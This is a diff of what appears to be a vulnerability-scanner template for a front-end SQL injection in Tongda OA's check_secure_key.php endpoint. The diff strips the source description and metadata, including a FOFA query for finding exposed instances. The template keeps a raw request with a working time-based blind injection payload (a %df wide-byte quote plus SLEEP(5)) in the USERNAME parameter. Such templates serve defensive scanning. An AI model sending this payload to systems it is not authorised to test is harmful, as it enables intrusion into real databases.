@@ -3,12 +3,8 @@ info:
   name: 通达OA check_secure_key 前台SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gobd37w68iytc47d'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gobd37w68iytc47d
-    fofa: title="office Anywhere" && icon_hash="-759108386" && "2011"
 http:
 - raw:
   - 'GET /ispirit/check_secure_key.php?USERNAME=%df''+AND+%28SELECT+6211+FROM+%28SELECT%28SLEEP%285%29%29%29vMBT%29--+NpkQ HTTP/1.1
